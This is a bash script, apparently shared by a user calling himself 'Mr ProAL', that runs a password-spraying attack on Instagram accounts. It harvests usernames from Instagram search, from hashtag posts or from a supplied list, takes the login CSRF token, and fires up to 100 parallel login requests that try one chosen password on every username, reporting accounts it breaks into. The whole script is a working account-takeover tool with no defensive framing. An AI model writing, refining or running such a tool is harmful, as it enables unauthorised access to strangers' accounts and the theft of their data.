#!/bin/bash


#color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#thread limit => kurangi boleh tapi jangan naikin :v
limit=100

#banner
clear
echo -e "              \e[1;31m█████████ \e[0m"
 echo -e "              \e[1;31m█▄█████▄█ \e[0m" 
 echo -e "              \e[1;31m█ ▼▼▼▼▼  \e[0m" 
 echo -e "             \e[1;31m █~~~~~~~~ \e[0m"
 echo -e "              \e[1;37m█ ▲▲▲▲▲ \e[0m"
 echo -e "              \e[1;37m█████████ \e[0m" 
 echo -e "             \e[1;37m ██ ██ \e[0m" 
 echo "" 
 echo -e " \e[1;32m     ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬● \e[0m"
  echo "        SUBSCRIBE MY CHANELL" 
  echo -e " \e[1;32m     ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬● \e[0m"
   echo "               Mr ProAL " 
   echo -e " \e[1;32m     ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬● \e[0m" 

#dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
        exit
    }
done

#menu
echo -e '''
1]. Dapatkan target dari spesifik \e[1;31m@username\e[1;37m
2]. Dapatkan target dari spesifik \e[1;31m#hashtag\e[1;37m
3]. Crack dari list target ente
'''

read -p $'Pilih yang mana cuk   : \e[1;33m' opt

touch target

case $opt in
    1) #menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Cantumkan username   : \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] Hanya ketemu        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
        read -p $'[\e[1;34m?\e[1;37m] Cantumkan Password   : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Mulai mengcrack...${white}"
        ;;
    2) #menu 2
        read -p $'\e[37m[\e[34m?\e[37m] Cantumkan hastag      : \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "kaga ketemu" ]]; then
        echo -e "$hashtag : ${red}Hashtag kaga ketemu${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "${white}[${blue}!${white}] Menghapus duplikat user dari tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "[${blue}+${white}] Hanya ketemu        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
            read -p $'[\e[34m?\e[37m] Cantumkan password   : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Mulai mengcrack...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
        fi
        ;;
    3) #menu 3
        read -p $'\e[37m[\e[34m?\e[37m] Masukan list lu   : \e[1;33m' list
        if [[ ! -e $list ]]; then
            echo -e "${red}file not found${white}"
            exit
            else
                cat $list > target
                echo -e "[${blue}+${white}] Total list lu   : ${yellow}"$(< target wc -l)
                read -p $'[\e[34m?\e[37m] Cantumkan password   : \e[1;33m' pass
                echo -e "${white}[${yellow}!${white}] ${red}Mulai mengcrack...${white}"
        fi
        ;;
    *) #wrong menu
        echo -e "${white}Pilihan kaga ada dimenu"
        sleep 1
        clear
        bash brute.sh
esac

#start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}Lu dapet! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}Crack gagal${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}

#thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target